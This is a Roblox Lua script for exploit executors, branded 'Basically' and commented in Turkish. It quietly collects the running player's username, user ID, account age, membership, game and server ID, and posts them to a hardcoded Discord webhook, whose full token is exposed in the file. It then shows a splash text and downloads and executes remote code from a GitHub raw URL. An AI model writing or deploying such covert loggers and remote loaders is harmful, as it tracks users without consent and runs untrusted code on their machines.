if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local TweenService = game:GetService("TweenService")
local player = Players.LocalPlayer

-- AYARLAR
local WEBHOOK_URL = "https://discord.com/api/webhooks/1418623242658119744/sFILV416P3ufF_d8Thvu3b5OzIQFA-KI7-yPIws8czMNsoz6Xs50xzntjd6odqNk23t1"

-- Webhook gönderme fonksiyonu
local function sendWebhook(data)
    local body = HttpService:JSONEncode(data)
    local requestFunc = syn and syn.request or (http_request or request or fluxus and fluxus.request)
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = body
            })
        end)
    end
end

-- Kullanıcı bilgilerini topla ve webhook'a gönder
function sendLog()
    local currentPlaceId = game.PlaceId
    local jobId = game.JobId
    local success, gameInfo = pcall(function()
        return MarketplaceService:GetProductInfo(currentPlaceId)
    end)
    
    local placeName = success and gameInfo.Name or "Bilinmiyor"
    local username = player.Name
    local displayName = player.DisplayName
    local userId = player.UserId
    local accountAge = player.AccountAge
    local membership = player.MembershipType.Name
    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
    
    -- Kullanıcı avatar URL'si (BUST fotoğrafı)
    local avatarUrl = string.format("https://www.roblox.com/bust-thumbnail/image?userId=%d&width=420&height=420&format=png", userId)
    
    -- Oyun ikon URL'si (game thumbnail)
    local gameIconUrl = string.format("https://www.roblox.com/asset-thumbnail/image?assetId=%d&width=768&height=432&format=png", currentPlaceId)
    
    -- Kullanıcı profil linki
    local profileUrl = string.format("https://www.roblox.com/users/%d/profile", userId)
    
    -- Oyun sayfası linki
    local gameUrl = string.format("https://www.roblox.com/games/%d", currentPlaceId)
    
    -- Oyuna katılma linki (JavaScript)
    local joinScript = string.format("javascript:Roblox.GameLauncher.joinGame(%d, '%s')", currentPlaceId, jobId)
    local joinUrl = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", currentPlaceId, jobId)

    local data = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "🔔 Basically Script Kullanım Logu",
            ["color"] = 16711680,
            ["thumbnail"] = {
                ["url"] = avatarUrl
            },
            ["image"] = {
                ["url"] = gameIconUrl
            },
            ["fields"] = {
                {
                    ["name"] = "👤 Kullanıcı Bilgileri",
                    ["value"] = string.format("**Kullanıcı Adı:** [%s](%s)\n**Display Adı:** %s\n**Kullanıcı ID:** %d\n**Hesap Yaşı:** %d gün\n**Üyelik:** %s", 
                        username, profileUrl, displayName, userId, accountAge, membership),
                    ["inline"] = true
                },
                {
                    ["name"] = "🎮 Oyun Bilgileri",
                    ["value"] = string.format("**Oyun:** [%s](%s)\n**Yer ID:** %d\n**Sunucu ID:** %s", 
                        placeName, gameUrl, currentPlaceId, jobId),
                    ["inline"] = true
                },
                {
                    ["name"] = "⏰ Zaman",
                    ["value"] = timestamp,
                    ["inline"] = true
                },
                {
                    ["name"] = "🔗 Katılma Linkleri",
                    ["value"] = string.format("**JavaScript:** `%s`\n**Normal Link:** [Oyuna Katıl](%s)", 
                        joinScript, joinUrl),
                    ["inline"] = false
                }
            },
            ["footer"] = {
                ["text"] = "basically • " .. timestamp,
                ["icon_url"] = "https://i.imgur.com/6gH3Ygv.png"
            },
            ["author"] = {
                ["name"] = "Basically Logger",
                ["icon_url"] = "https://i.imgur.com/6gH3Ygv.png"
            }
        }}
    }
    
    sendWebhook(data)
end

-- Basically yazısı göster
function showBasicallyText()
    local textGui = Instance.new("ScreenGui")
    textGui.Name = "BasicallyText"
    textGui.Parent = game.Players.LocalPlayer.PlayerGui
    textGui.ResetOnSpawn = false
    
    local textLabel = Instance.new("TextLabel")
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.Position = UDim2.new(0, 0, 0, 0)
    textLabel.BackgroundTransparency = 1
    textLabel.Text = "basically"
    textLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
    textLabel.Font = Enum.Font.GothamBlack
    textLabel.TextSize = 120
    textLabel.TextStrokeTransparency = 0
    textLabel.TextStrokeColor3 = Color3.fromRGB(255, 0, 128)
    textLabel.ZIndex = 999
    textLabel.Parent = textGui
    
    -- Animasyon
    textLabel.TextTransparency = 1
    
    local tweenInfo = TweenInfo.new(1.5, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
    local fadeIn = TweenService:Create(textLabel, tweenInfo, {TextTransparency = 0})
    local fadeOut = TweenService:Create(textLabel, tweenInfo, {TextTransparency = 1})
    
    fadeIn:Play()
    fadeIn.Completed:Connect(function()
        wait(1.2)
        fadeOut:Play()
        fadeOut.Completed:Connect(function()
            textGui:Destroy()
        end)
    end)
end

-- Script yükleme
sendLog()
showBasicallyText()
wait(3)
loadstring(game:HttpGet("https://raw.githubusercontent.com/0kr-0/timerr/refs/heads/main/test"))()
